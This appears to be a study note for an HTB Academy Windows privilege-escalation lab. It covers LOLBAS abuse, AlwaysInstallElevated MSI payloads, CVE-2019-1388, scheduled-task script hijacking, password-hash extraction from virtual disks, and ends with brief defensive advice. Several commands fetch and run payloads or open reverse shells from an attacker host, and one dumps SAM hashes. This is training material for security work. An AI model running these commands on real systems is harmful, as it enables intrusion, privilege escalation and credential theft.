# Miscellaneous Techniques

## 🎯 Overview

**Miscellaneous techniques** encompass **LOLBAS exploitation**, **policy misconfigurations**, **CVE-specific vulnerabilities**, **scheduled task abuse**, and **virtual disk mounting** for hash extraction. These methods provide alternative privilege escalation vectors when standard techniques fail.

## 🏠 Living Off The Land Binaries (LOLBAS)

### LOLBAS Concept
```cmd
# LOLBAS characteristics:
- Microsoft-signed binaries/scripts/libraries
- Native to OS or downloadable from Microsoft
- Unexpected functionality useful for attackers
- Bypass security controls via trusted processes
```

### Common LOLBAS Functions
```cmd
# Attack capabilities:
- Code execution & compilation
- File transfers & encoding
- Persistence mechanisms
- UAC bypass techniques
- Credential theft & dumping
- Process memory dumping
- DLL hijacking & evasion
```

### Certutil File Transfer
```cmd
# Download files with certutil:
certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat

# Base64 encoding:
certutil -encode file1 encodedfile

# Base64 decoding:
certutil -decode encodedfile file2

# Result: File transfer without traditional download tools
```

### Rundll32 DLL Execution
```cmd
# Execute DLL files:
rundll32.exe user32.dll,LockWorkStation
rundll32.exe shell32.dll,ShellExec_RunDLL cmd.exe

# Remote DLL execution:
rundll32.exe \\<ip>\share\malicious.dll,EntryPoint
```

## 🔺 AlwaysInstallElevated Exploitation

### Policy Configuration
```cmd
# Group Policy locations:
Computer Configuration\Administrative Templates\Windows Components\Windows Installer
User Configuration\Administrative Templates\Windows Components\Windows Installer

# Setting: "Always install with elevated privileges" = Enabled
```

### Registry Enumeration
```cmd
# Check both registry locations:
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

# Both should show:
AlwaysInstallElevated    REG_DWORD    0x1
```

### MSI Payload Generation
```bash
# Generate malicious MSI with msfvenom:
msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi

# Payload details:
Platform: Windows x86
Payload size: 324 bytes
Final MSI size: 159744 bytes
```

### MSI Execution
```cmd
# Execute MSI with elevated privileges:
msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart

# Flags:
/quiet    # Suppress user interface
/qn       # No user interaction
/norestart # Prevent automatic restart

# Result: Reverse shell as NT AUTHORITY\SYSTEM
```

## 🔓 CVE-2019-1388 (Windows Certificate Dialog)

### Vulnerability Details
```cmd
# Affected components:
- Windows Certificate Dialog UAC mechanism
- Certificate with OID 1.3.6.1.4.1.311.2.1.10 (SpcSpAgencyInfo)
- Vulnerable binary: hhupd.exe (old Microsoft-signed)

# Vulnerability: Hyperlink in certificate opens browser as SYSTEM
```

### Exploitation Steps
```cmd
# 1. Right-click hhupd.exe > Run as administrator
# 2. Click "Show information about the publisher's certificate"
# 3. Navigate to General tab
# 4. Click hyperlink in "Issued by" field
# 5. Browser opens as NT AUTHORITY\SYSTEM
# 6. Right-click webpage > View page source
# 7. Right-click source > Save as
# 8. Type in Save As dialog: c:\windows\system32\cmd.exe
# 9. Press Enter = CMD as SYSTEM
```

### Vulnerable Versions
```cmd
# Patched: November 2019
# Check for vulnerable systems:
- Windows Server 2008/2012/2016/2019 (pre-patch)
- Windows 7/8/10 (pre-November 2019)
- Legacy systems without updates
```

## 📅 Scheduled Task Enumeration

### Basic Task Enumeration
```cmd
# List scheduled tasks:
schtasks /query /fo LIST /v

# PowerShell enumeration:
Get-ScheduledTask | select TaskName,State

# Filter for interesting tasks:
Get-ScheduledTask | where {$_.TaskName -notlike "*Microsoft*"} | select TaskName,State
```

### Task Permission Analysis
```cmd
# Check task directory permissions:
.\accesschk64.exe /accepteula -s -d C:\Windows\System32\Tasks

# Look for writable task directories:
C:\Scripts\                    # Custom script directories
C:\Windows\Tasks\              # Legacy task location
C:\ProgramData\*\Tasks\        # Application-specific tasks
```

### Task Script Modification
```cmd
# Check script permissions in task directories:
.\accesschk64.exe /accepteula -s -d C:\Scripts\

# Example output:
C:\Scripts
  RW BUILTIN\Users           # Writable by standard users!
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators

# Modify existing scripts:
echo "powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.3/shell.ps1')" >> C:\Scripts\backup.ps1
```

## 💿 Virtual Disk Mounting & Hash Extraction

### Virtual Disk File Types
```cmd
# Target file extensions:
.vhd     # Virtual Hard Disk (Hyper-V)
.vhdx    # Virtual Hard Disk v2 (Hyper-V)  
.vmdk    # Virtual Machine Disk (VMware)

# Common locations:
- Network backup shares
- Virtualization host storage
- Development environments
- System backup locations
```

### Linux Mounting
```bash
# Mount VMDK files:
guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk

# Mount VHD/VHDX files:
guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1

# Browse mounted filesystem:
ls /mnt/vmdk/Windows/System32/config/
```

### Windows Mounting
```cmd
# Right-click method:
1. Right-click .vhd/.vhdx file
2. Select "Mount"
3. Access as lettered drive

# PowerShell method:
Mount-VHD -Path "C:\backup\server.vhdx"

# Disk Management method:
1. Open Disk Management
2. Action > Attach VHD
3. Browse to file location
```

### Hash Extraction from Virtual Disks
```bash
# Extract registry hives from mounted disk:
cp /mnt/vmdk/Windows/System32/config/SAM .
cp /mnt/vmdk/Windows/System32/config/SECURITY .
cp /mnt/vmdk/Windows/System32/config/SYSTEM .

# Extract password hashes:
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL

# Example output:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

## 👤 User/Computer Description Field

### Local User Description Enumeration
```powershell
# Check user descriptions for passwords:
Get-LocalUser

# Example output with password in description:
Name            Enabled Description
----            ------- -----------
Administrator   True    Built-in account for administering the computer/domain
secsvc          True    Network scanner - do not change password
helpdesk        True    Password: Help123!
```

### Computer Description Field
```powershell
# Check computer description:
Get-WmiObject -Class Win32_OperatingSystem | select Description

# Example output:
Description
-----------
The most vulnerable box ever!
```

### Active Directory Description Fields
```cmd
# Domain user descriptions (if domain-joined):
net user <username> /domain
Get-ADUser -Identity <username> -Properties Description
```

## 🎯 HTB Academy Lab Solution

### Lab Environment
```cmd
# Access: RDP with htb-student:HTB_@cademy_stdnt!
# Objective: Find cleartext password for account on target host
```

### Multi-Method Approach
```cmd
# Method 1: User description field enumeration
Get-LocalUser

# Method 2: AlwaysInstallElevated check
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Method 3: Scheduled task script enumeration
Get-ScheduledTask | select TaskName,State
.\accesschk64.exe /accepteula -s -d C:\Scripts\

# Method 4: Virtual disk file search
dir /s *.vhd *.vhdx *.vmdk

# Expected result: Password found in user description or script files
```

## 🔄 Advanced Miscellaneous Techniques

### File System Analysis Tools
```cmd
# Snaffler for comprehensive file enumeration:
.\Snaffler.exe -s -o snaffler.log

# Target file types:
- Files with "pass" in filename
- KeePass database files (.kdbx)
- SSH keys (id_rsa, *.pem)
- Web.config files
- Virtual disk files (.vhd, .vhdx, .vmdk)
```

### LOLBAS Exploitation Examples
```cmd
# Bitsadmin file transfer:
bitsadmin /transfer myDownloadJob /download /priority normal http://10.10.14.3/shell.exe C:\temp\shell.exe

# Forfiles command execution:
forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe

# Mshta code execution:
mshta http://10.10.14.3/malicious.hta
```

## ⚠️ Detection & Defense

### Detection Indicators
```cmd
# Monitor for:
- LOLBAS binary usage outside normal context
- MSI installations by standard users
- Certificate dialog browser spawning
- Virtual disk mounting activities
- Scheduled task script modifications
- Unusual certutil/bitsadmin usage
```

### Defensive Measures
```cmd
# Security recommendations:
- Disable AlwaysInstallElevated policy
- Patch CVE-2019-1388 and similar vulnerabilities
- Monitor LOLBAS binary execution
- Secure scheduled task script permissions
- Restrict virtual disk file access
- Implement application allowlisting
- Regular privilege escalation assessments
```

## 💡 Key Takeaways

1. **LOLBAS binaries** provide trusted execution paths for malicious activities
2. **AlwaysInstallElevated** enables reliable privilege escalation via MSI
3. **CVE-2019-1388** demonstrates certificate dialog UAC bypass
4. **Scheduled tasks** with weak permissions offer persistence opportunities
5. **Virtual disk files** contain complete filesystem copies for offline analysis
6. **User descriptions** sometimes contain cleartext passwords
7. **Multiple vectors** increase success probability in hardened environments

---

*Miscellaneous techniques exploit Windows features, policies, and file systems that may be overlooked during standard privilege escalation enumeration.* 